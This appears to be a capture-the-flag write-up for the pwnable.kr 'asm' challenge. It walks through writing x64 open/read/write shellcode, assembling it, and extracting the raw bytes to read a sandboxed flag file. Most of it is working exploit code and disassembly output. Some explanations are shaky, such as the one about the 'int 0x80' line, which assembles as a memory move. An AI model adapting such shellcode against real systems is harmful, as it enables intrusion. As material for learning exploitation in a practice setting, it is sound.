# Asm

For this challenge we have to write some shellcode. If you don't know what this is, it's machine code used to exploit buffer overflows, commonly created to spawn a shell. We'll work locally to save time.

Let's read the code:

```c
char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
memset(sh, 0x90, 0x1000);
memcpy(sh, stub, strlen(stub));

int offset = sizeof(stub);
printf("give me your x64 shellcode: ");
read(0, sh+offset, 1000);

alarm(10);
chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
sandbox();
((void (*)(void))sh)();
```

We have 1000 bytes to play with, which are read to our buffer and then ran.

This is going to be easier than a real scenario because there's no need to figure out the offset between the buffer and the return address.

In reality we would also commonly need to change instructions in our assembly in order to remove any null bytes from the machine code, which are usually a flag for string copy functions to stop reading.

Another thing to notice is that the name of the flag file is 231-byte long:

```
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```

We have to take care not to make our shellcode too big so we can fit this name there or use some trick to input the name via `stdin`. We'll do the first for completeness and the second is left as an exercise.

The code also informs us that only open, read and write syscalls are available in our sandbox.

Let's write our program then:

```c
#include <fcntl.h>
#include <unistd.h>

char *name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";

void main() {
    char flag[100];
    read(open(name, O_RDONLY), flag, 100);
    write(1, flag, 100);
}
```

We need to do this in assembly, though. For this we'll need to keep a few things in mind:

1. We can always compile C to assembly with `$ gcc -S <file.c> -o <file>`, in case we need help with something.
2. Our calling convention, `System V`, in which arguments are stored in the `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, `xmm0`–`xmm7` registers, in this order, and return values are stored in `rax`.
3. The syscall codes for read, write and open:

| call  | asm                      |
|-------|--------------------------|
| read  | movq $0, %rax<br>syscall |
| write | movq $1, %rax<br>syscall |
| open  | movq $2, %rax<br>syscall |

```asm
.section .data
    name: .string "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

.section .text
.global _start
_start:
    movq $100, %rbx  # store size
    subq %rbx, %rsp  # allocate size bytes

    leaq name(%rip), %rdi  # first argument (name)
    movl $0, %esi  # second argument (O_RDONLY)
    movq $2, %rax  # open syscall code
    syscall

    movl %eax, %edi  # first argument (return from open)
    leaq -100(%rsp), %rsi  # second argument (buffer address)
    movl %ebx, %edx  # third argument (size)
    movq $0, %rax  # read syscall code
    syscall

    movl $1, %edi  # first argument (stdout descriptor)
    leaq -100(%rsp), %rsi  # second argument (buffer address)
    movl %ebx, %edx  # third argument (size)
    movq $1, %rax  # write syscall code
    syscall
```

We can now assemble, link and test:

```bash
$ as shell.s -o shell.o
$ ld shell.o -o shell
$ echo "flag" > this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
$ ./shell
flag
[1]    30850 segmentation fault (core dumped)  ./shell
```

It works! Now we need to do something to our `name` variable, because we don't have control over the data section of a program which is already running. Let's use this trick:

```asm
.section .text
.global _start
_start:
    movq $100, %rbx  # store size
    subq %rbx, %rsp  # allocate size bytes

jmp jmp_here
jmp_back:
    popq %rdi  # first argument (name)
    movl $0, %esi  # second argument (O_RDONLY)
    movq $2, %rax  # open syscall code
    syscall

    movl %eax, %edi  # first argument (return from open)
    leaq -100(%rsp), %rsi  # second argument (buffer address)
    movl %ebx, %edx  # third argument (size)
    movq $0, %rax  # read syscall code
    syscall

    movl $1, %edi  # first argument (stdout descriptor)
    leaq -100(%rsp), %rsi  # second argument (buffer address)
    movl %ebx, %edx  # third argument (size)
    movq $1, %rax  # write syscall code
    syscall
    int 0x80

jmp_here:
    call jmp_back
name:
    .string "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
```

Why are we jumping to `jmp_here` and then calling `jmp_back` again? Because when we make a call, the return address is pushed onto the stack. Here the return address will be the address of `name`, which is now in the text segment.

Right after the `jmp_here` jump, in `jmp_back`, we pop this address and store in `rdi`, the first argument of the `open` syscall later on. Lastly we add a `0x80` syscall (interrupt) to make sure our program doesn't loop forever. Genius!

We can now get our shellcode:

```bash
$ objdump -d shell
[...]
0000000000400078 <_start>:
  400078:	48 c7 c3 64 00 00 00 	mov    $0x64,%rbx
  40007f:	48 29 dc             	sub    %rbx,%rsp
  400082:	eb 40                	jmp    4000c4 <do_call>

0000000000400084 <jmp_back>:
  400084:	5f                   	pop    %rdi
  400085:	be 00 00 00 00       	mov    $0x0,%esi
  40008a:	48 c7 c0 02 00 00 00 	mov    $0x2,%rax
  400091:	0f 05                	syscall 
  400093:	89 c7                	mov    %eax,%edi
  400095:	48 8d 74 24 9c       	lea    -0x64(%rsp),%rsi
  40009a:	89 da                	mov    %ebx,%edx
  40009c:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
  4000a3:	0f 05                	syscall 
  4000a5:	bf 01 00 00 00       	mov    $0x1,%edi
  4000aa:	48 8d 74 24 9c       	lea    -0x64(%rsp),%rsi
  4000af:	89 da                	mov    %ebx,%edx
  4000b1:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
  4000b8:	0f 05                	syscall 
  4000ba:	48 8b 04 25 80 00 00 	mov    0x80,%rax
  4000c1:	00 
  4000c2:	0f 05                	syscall 

00000000004000c4 <do_call>:
  4000c4:	e8 bb ff ff ff       	callq  400084 <jmp_back>

00000000004000c9 <name>:
  4000c9:	74 68                	je     400133 <name+0x6a>
  4000cb:	69 73 5f 69 73 5f 70 	imul   $0x705f7369,0x5f(%rbx),%esi
  4000d2:	77 6e                	ja     400142 <name+0x79>
  4000d4:	61                   	(bad)  
  4000d5:	62                   	(bad)  
  4000d6:	6c                   	insb   (%dx),%es:(%rdi)
  4000d7:	65 2e 6b 72 5f 66    	gs imul $0x66,%cs:0x5f(%rdx),%esi
  4000dd:	6c                   	insb   (%dx),%es:(%rdi)
  4000de:	61                   	(bad)  
  4000df:	67 5f                	addr32 pop %rdi
  4000e1:	66 69 6c 65 5f 70 6c 	imul   $0x6c70,0x5f(%rbp,%riz,2),%bp
  4000e8:	65 61                	gs (bad) 
  4000ea:	73 65                	jae    400151 <name+0x88>
  4000ec:	5f                   	pop    %rdi
  4000ed:	72 65                	jb     400154 <name+0x8b>
  4000ef:	61                   	(bad)  
  4000f0:	64 5f                	fs pop %rdi
  4000f2:	74 68                	je     40015c <name+0x93>
  4000f4:	69 73 5f 66 69 6c 65 	imul   $0x656c6966,0x5f(%rbx),%esi
  4000fb:	2e 73 6f             	jae,pn 40016d <name+0xa4>
  4000fe:	72 72                	jb     400172 <name+0xa9>
  400100:	79 5f                	jns    400161 <name+0x98>
  400102:	74 68                	je     40016c <name+0xa3>
  400104:	65 5f                	gs pop %rdi
  400106:	66 69 6c 65 5f 6e 61 	imul   $0x616e,0x5f(%rbp,%riz,2),%bp
  40010d:	6d                   	insl   (%dx),%es:(%rdi)
  40010e:	65 5f                	gs pop %rdi
  400110:	69 73 5f 76 65 72 79 	imul   $0x79726576,0x5f(%rbx),%esi
  400117:	5f                   	pop    %rdi
  400118:	6c                   	insb   (%dx),%es:(%rdi)
  400119:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400120:	6f                   	outsl  %ds:(%rsi),(%dx)
  400121:	6f                   	outsl  %ds:(%rsi),(%dx)
  400122:	6f                   	outsl  %ds:(%rsi),(%dx)
  400123:	6f                   	outsl  %ds:(%rsi),(%dx)
  400124:	6f                   	outsl  %ds:(%rsi),(%dx)
  400125:	6f                   	outsl  %ds:(%rsi),(%dx)
  400126:	6f                   	outsl  %ds:(%rsi),(%dx)
  400127:	6f                   	outsl  %ds:(%rsi),(%dx)
  400128:	6f                   	outsl  %ds:(%rsi),(%dx)
  400129:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400130:	6f                   	outsl  %ds:(%rsi),(%dx)
  400131:	6f                   	outsl  %ds:(%rsi),(%dx)
  400132:	6f                   	outsl  %ds:(%rsi),(%dx)
  400133:	6f                   	outsl  %ds:(%rsi),(%dx)
  400134:	6f                   	outsl  %ds:(%rsi),(%dx)
  400135:	6f                   	outsl  %ds:(%rsi),(%dx)
  400136:	6f                   	outsl  %ds:(%rsi),(%dx)
  400137:	6f                   	outsl  %ds:(%rsi),(%dx)
  400138:	6f                   	outsl  %ds:(%rsi),(%dx)
  400139:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400140:	6f                   	outsl  %ds:(%rsi),(%dx)
  400141:	6f                   	outsl  %ds:(%rsi),(%dx)
  400142:	6f                   	outsl  %ds:(%rsi),(%dx)
  400143:	6f                   	outsl  %ds:(%rsi),(%dx)
  400144:	6f                   	outsl  %ds:(%rsi),(%dx)
  400145:	6f                   	outsl  %ds:(%rsi),(%dx)
  400146:	6f                   	outsl  %ds:(%rsi),(%dx)
  400147:	6f                   	outsl  %ds:(%rsi),(%dx)
  400148:	6f                   	outsl  %ds:(%rsi),(%dx)
  400149:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400150:	6f                   	outsl  %ds:(%rsi),(%dx)
  400151:	6f                   	outsl  %ds:(%rsi),(%dx)
  400152:	6f                   	outsl  %ds:(%rsi),(%dx)
  400153:	6f                   	outsl  %ds:(%rsi),(%dx)
  400154:	6f                   	outsl  %ds:(%rsi),(%dx)
  400155:	6f                   	outsl  %ds:(%rsi),(%dx)
  400156:	6f                   	outsl  %ds:(%rsi),(%dx)
  400157:	6f                   	outsl  %ds:(%rsi),(%dx)
  400158:	6f                   	outsl  %ds:(%rsi),(%dx)
  400159:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400160:	6f                   	outsl  %ds:(%rsi),(%dx)
  400161:	6f                   	outsl  %ds:(%rsi),(%dx)
  400162:	6f                   	outsl  %ds:(%rsi),(%dx)
  400163:	6f                   	outsl  %ds:(%rsi),(%dx)
  400164:	6f                   	outsl  %ds:(%rsi),(%dx)
  400165:	30 30                	xor    %dh,(%rax)
  400167:	30 30                	xor    %dh,(%rax)
  400169:	30 30                	xor    %dh,(%rax)
  40016b:	30 30                	xor    %dh,(%rax)
  40016d:	30 30                	xor    %dh,(%rax)
  40016f:	30 30                	xor    %dh,(%rax)
  400171:	30 30                	xor    %dh,(%rax)
  400173:	30 30                	xor    %dh,(%rax)
  400175:	30 30                	xor    %dh,(%rax)
  400177:	30 30                	xor    %dh,(%rax)
  400179:	30 30                	xor    %dh,(%rax)
  40017b:	30 30                	xor    %dh,(%rax)
  40017d:	30 6f 6f             	xor    %ch,0x6f(%rdi)
  400180:	6f                   	outsl  %ds:(%rsi),(%dx)
  400181:	6f                   	outsl  %ds:(%rsi),(%dx)
  400182:	6f                   	outsl  %ds:(%rsi),(%dx)
  400183:	6f                   	outsl  %ds:(%rsi),(%dx)
  400184:	6f                   	outsl  %ds:(%rsi),(%dx)
  400185:	6f                   	outsl  %ds:(%rsi),(%dx)
  400186:	6f                   	outsl  %ds:(%rsi),(%dx)
  400187:	6f                   	outsl  %ds:(%rsi),(%dx)
  400188:	6f                   	outsl  %ds:(%rsi),(%dx)
  400189:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400190:	6f                   	outsl  %ds:(%rsi),(%dx)
  400191:	6f                   	outsl  %ds:(%rsi),(%dx)
  400192:	6f                   	outsl  %ds:(%rsi),(%dx)
  400193:	6f                   	outsl  %ds:(%rsi),(%dx)
  400194:	6f                   	outsl  %ds:(%rsi),(%dx)
  400195:	30 30                	xor    %dh,(%rax)
  400197:	30 30                	xor    %dh,(%rax)
  400199:	30 30                	xor    %dh,(%rax)
  40019b:	30 30                	xor    %dh,(%rax)
  40019d:	30 30                	xor    %dh,(%rax)
  40019f:	30 30                	xor    %dh,(%rax)
  4001a1:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001a2:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001a5:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001a6:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001a9:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001aa:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001ad:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001ae:	6e                   	outsb  %ds:(%rsi),(%dx)
  4001af:	67                   	addr32
	...
```

It would be too much work to put this together by hand. Let's use this snippet to make it easier:

```bash
$ for i in $(objdump -d shell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$') ; do echo -n "\\x$i" ; done
\x48\xc7\xc3\x64\x00\x00\x00\x48\x29\xdc\xeb\x40\x5f\xbe\x00\x00\x00\x00\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x8d\x74\x24\x9c\x89\xda\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x8d\x74\x24\x9c\x89\xda\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x8b\x04\x25\x80\x00\x00\x00\x0f\x05\xe8\xbb\xff\xff\xff\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67
```

We can now input this to the program and get the flag.
